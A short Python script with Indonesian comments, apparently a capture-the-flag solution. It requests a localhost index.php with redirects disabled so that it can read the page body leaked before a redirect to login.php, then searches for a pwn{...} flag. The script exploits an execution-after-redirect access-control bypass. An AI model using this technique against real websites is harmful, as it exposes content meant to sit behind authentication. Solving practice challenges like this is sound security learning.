import requests
import re

url = "http://localhost:1337/index.php"

# Gunakan allow_redirects=False agar script tidak pindah ke login.php
# Kita ingin membaca body response dari index.php yang bocor
try:
    print(f"[*] Sending request to {url} (Allow Redirects: False)...")
    response = requests.get(url, allow_redirects=False)
    
    print(f"[*] Status Code: {response.status_code}")
    
    # Mencari pola flag pwn{...}
    flag_match = re.search(r'pwn\{.*?\}', response.text)
    
    if flag_match:
        print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}\n")
    else:
        print("[-] Flag not found in the response body.")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Connection Error: {e}")
